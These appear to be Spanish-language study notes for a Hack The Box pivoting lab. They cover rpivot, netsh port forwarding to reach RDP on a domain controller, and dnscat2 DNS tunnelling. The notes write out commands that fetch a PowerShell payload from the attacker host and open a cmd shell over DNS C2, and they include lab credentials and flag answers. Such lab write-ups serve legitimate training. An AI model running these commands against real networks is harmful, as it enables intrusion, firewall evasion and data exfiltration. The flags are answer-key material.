# Terminal 1
git clone https://github.com/klsecservices/rpivot.git
cd rpivot
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0

# Terminal 2
scp -r rpivot ubuntu@10.129.202.19:/home/ubuntu/
cd rpivot
python2 client.py --server-ip 10.10.15.3 --server-port 9999

# Terminal 3
proxychains firefox-esr 172.16.5.135:80
proxychains curl 172.16.5.135:80
```

> I_L0v3_PrOxy_Ch@ins

# Port Forwarding with Windows Netsh
`netsh.exe` es una herramienta de línea de comandos de Windows útil para configuración de red. Entre sus usos están: ver rutas, configuración del firewall, agregar proxies y crear reglas de port forwarding.

## Escenario
Tienes acceso a una workstation Windows comprometida con dos interfaces:
- `10.129.15.150` (red del atacante)
- `172.16.5.19` (red interna)

El objetivo es alcanzar `172.16.5.25:3389` (RDP) desde tu máquina atacante, usando la workstation como pivot.

### Crear la regla de port forwarding
```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```
Esto hace que todo tráfico que llegue a `10.129.15.150:8080` sea redirigido a `172.16.5.25:3389`.

### Verificar la regla
```cmd
netsh.exe interface portproxy show v4tov4
```

### Conectarse desde la máquina atacante
Con la regla activa, conectas vía RDP a `10.129.15.150:8080` (por ejemplo con `xfreerdp`) y el tráfico es redirigido automáticamente al host interno en el puerto 3389.

En esencia: netsh convierte la máquina Windows pivot en un proxy TCP sin necesidad de software adicional, lo que lo hace muy útil para movimiento lateral en entornos Windows.

## Connect to HTB
#### Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.215.171 connectport=3389 connectaddress=172.16.5.19
```

```sh
xfreerdp /v:10.129.215.171:8080 /u:victor /p:'pass@123' /dynamic-resolution
```

> Jim Flipflop

# DNS Tunneling with Dnscat2
Dnscat2 tunnels C2 traffic over DNS (TXT records), making it stealthy against firewalls that inspect HTTPS. Data is exfiltrated disguised as DNS queries toward an external server.

## Setup on Attack Host
```sh
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### Start the server
```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

The server generates a pre-shared secret (e.g. `0ec04a91cd1e963f8c03ca499d589d21`) needed to authenticate the client.

## On the Windows Target
Transfer `dnscat2.ps1` (from `dnscat2-powershell`) and execute:
```pwsh
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```

## Interact with the Session (Attack Host)
```bash
# List options
dnscat2> ?

# Open shell session
dnscat2> window -i 1
```

A successful connection shows: Session 1 Security: ENCRYPTED AND VERIFIED!

## Connect to HTB
#### Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.
```bash
xfreerdp /v:10.129.215.174 /u:htb-student /p:'HTB_@cademy_stdnt!' /dynamic-resolution

# Máquina atacante
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install

sudo ruby dnscat2.rb --dns host=10.10.14.74,port=53,domain=inlanefreight.local --no-cache
> f965c66919bbd5f014046b5ae0919bfb

git clone https://github.com/lukebaggett/dnscat2-powershell.git

python3 -m http.server 8080

# En la víctima Windows
Invoke-WebRequest -Uri "http://10.10.14.74:8080/dnscat2.ps1" -OutFile "C:\Windows\Temp\dnscat2.ps1"

Import-Module C:\Windows\Temp\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.74 -Domain inlanefreight.local -PreSharedSecret f965c66919bbd5f014046b5ae0919bfb -Exec cmd
```